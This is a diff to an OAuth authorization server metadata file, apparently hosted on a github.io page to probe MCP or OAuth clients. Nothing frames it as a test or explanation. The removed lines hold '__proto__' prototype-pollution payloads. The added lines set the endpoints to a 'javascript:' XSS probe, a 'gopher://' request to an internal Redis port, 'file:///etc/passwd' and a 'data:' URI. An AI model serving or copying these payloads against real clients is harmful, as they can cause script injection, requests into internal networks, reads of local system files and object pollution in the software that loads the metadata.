@@ -1,1 +1,12 @@
-{"issuer":"https://zzhou5797-bot.github.io","authorization_endpoint":"https://zzhou5797-bot.github.io/a","token_endpoint":"https://zzhou5797-bot.github.io/t","scopes_supported":{"__proto__":{"scopes_supported":["ZZNEST-SCOPES"],"codeChallengeMethodsSupported":["ZZNEST-CCM"]}},"mcpConfig":{"__proto__":{"polluted":"ZZNEST-9931"}}}
+{
+ "issuer":"https://zzhou5797-bot.github.io",
+ "authorization_endpoint":"javascript:alert('ZZ-AUTH-JS')",
+ "token_endpoint":"gopher://10.5.3.58:6379/_ZZ-TOKEN-GOPHER",
+ "registration_endpoint":"file:///etc/passwd",
+ "jwks_uri":"data:text/plain,ZZ-JWKS-DATA",
+ "scopes_supported":["openid"],
+ "response_types_supported":["code"],
+ "grant_types_supported":["authorization_code"],
+ "code_challenge_methods_supported":["S256"],
+ "token_endpoint_auth_methods_supported":["none"]
+}
